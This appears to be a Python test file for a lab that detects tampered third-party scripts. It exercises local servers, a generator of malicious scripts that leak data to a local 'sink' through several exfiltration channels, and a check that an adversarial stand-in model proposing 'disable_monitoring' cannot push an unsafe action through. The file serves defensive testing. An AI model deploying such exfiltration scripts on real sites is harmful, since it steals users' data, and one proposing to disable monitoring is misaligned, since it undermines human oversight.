"""Fast contracts for the lab servers and the pilot's own assertion
wiring, runnable without launching a real browser, so CI can validate
these before paying for the real Playwright run."""
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import lab_servers

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "engine"))
from predict_shield.script_integrity import FetchRejected, RegisteredScript, fetch_script_observation


class LabServerTests(unittest.TestCase):
    def test_vendor_server_serves_the_current_script_body(self):
        state = lab_servers.VendorState()
        vendor = lab_servers.start_server("127.0.0.1", lab_servers.make_vendor_handler(state))
        try:
            host, port = vendor.server_address
            script = RegisteredScript(script_id="x", url=f"http://{host}:{port}/widget.js",
                                      trusted_sha384=("a" * 96,))
            observation = fetch_script_observation(script, (host,), allow_private_addresses=True)
            self.assertEqual(observation.status_code, 200)
        finally:
            vendor.shutdown()

    def test_vendor_server_rejects_an_unregistered_host(self):
        state = lab_servers.VendorState()
        vendor = lab_servers.start_server("127.0.0.1", lab_servers.make_vendor_handler(state))
        try:
            host, port = vendor.server_address
            script = RegisteredScript(script_id="x", url=f"http://{host}:{port}/widget.js",
                                      trusted_sha384=("a" * 96,))
            with self.assertRaises(FetchRejected):
                fetch_script_observation(script, ("some-other-host",), allow_private_addresses=True)
        finally:
            vendor.shutdown()

    def test_malicious_script_body_differs_from_good_body(self):
        good = lab_servers.GOOD_SCRIPT
        malicious = lab_servers.malicious_script("http://127.0.0.2:9999")
        self.assertNotEqual(good, malicious)
        self.assertIn(b"127.0.0.2:9999", malicious)

    def test_benign_update_differs_from_good_but_keeps_behavior_marker(self):
        self.assertNotEqual(lab_servers.GOOD_SCRIPT, lab_servers.BENIGN_UPDATE_SCRIPT)
        self.assertIn(b"checkout-button", lab_servers.BENIGN_UPDATE_SCRIPT)

    def test_sink_server_records_every_hit(self):
        sink_state = lab_servers.SinkState()
        sink = lab_servers.start_server("127.0.0.2", lab_servers.make_sink_handler(sink_state))
        try:
            import urllib.request
            host, port = sink.server_address
            urllib.request.urlopen(f"http://{host}:{port}/exfil?c=test", timeout=5).read()
            self.assertIn("/exfil?c=test", sink_state.hits)
        finally:
            sink.shutdown()


class ExfilChannelTests(unittest.TestCase):
    def test_every_channel_produces_a_distinct_script_that_targets_the_sink(self):
        bodies = {c: lab_servers.malicious_script("http://127.0.0.2:9999", c) for c in lab_servers.EXFIL_CHANNELS}
        self.assertEqual(len(set(bodies.values())), len(lab_servers.EXFIL_CHANNELS))
        for body in bodies.values():
            self.assertIn(b"127.0.0.2:9999", body)

    def test_an_unknown_channel_is_refused(self):
        with self.assertRaises(ValueError):
            lab_servers.malicious_script("http://127.0.0.2:9999", "smoke-signals")


class LiveModelRunnerTests(unittest.TestCase):
    """The live-model runner's structural checks, exercised with stand-in
    models so CI covers them without a provider key."""

    def _run(self, reply_fn):
        import json, tempfile
        import run_live_model_proposer as runner

        class StandIn:
            name = "stand-in"

            def __init__(self, *args, **kwargs):
                self.calls = 0

            def complete(self, system, prompt):
                self.calls += 1
                return json.dumps(reply_fn(self.calls))

        original = runner.HostedChatModel, runner.OllamaModel
        runner.HostedChatModel = runner.OllamaModel = StandIn
        try:
            with tempfile.TemporaryDirectory() as tmp:
                return runner.run("ollama", "stand-in", Path(tmp) / "out.json")
        finally:
            runner.HostedChatModel, runner.OllamaModel = original

    def test_an_adversarial_model_cannot_violate_a_safety_property(self):
        replies = [{"severity": "low", "action": "disable_monitoring", "rationale": "x"},
                   {"severity": "low", "action": "block_vendor_script", "rationale": "x"}]
        report = self._run(lambda n: replies[n % 2])
        self.assertTrue(report["passed"], report["violations"])
        self.assertTrue(all(c["selected_action"] != "block_vendor_script" for c in report["cases"]))

    def test_a_cooperative_model_can_reach_an_eligible_plan(self):
        report = self._run(lambda n: {"severity": "high", "action": "restrict_all_fetch_targets",
                                      "rationale": "contain"})
        self.assertTrue(report["passed"], report["violations"])
        self.assertIn("ELIGIBLE_LAB_PLAN", [c["selection_status"] for c in report["cases"]])


if __name__ == "__main__":
    unittest.main()
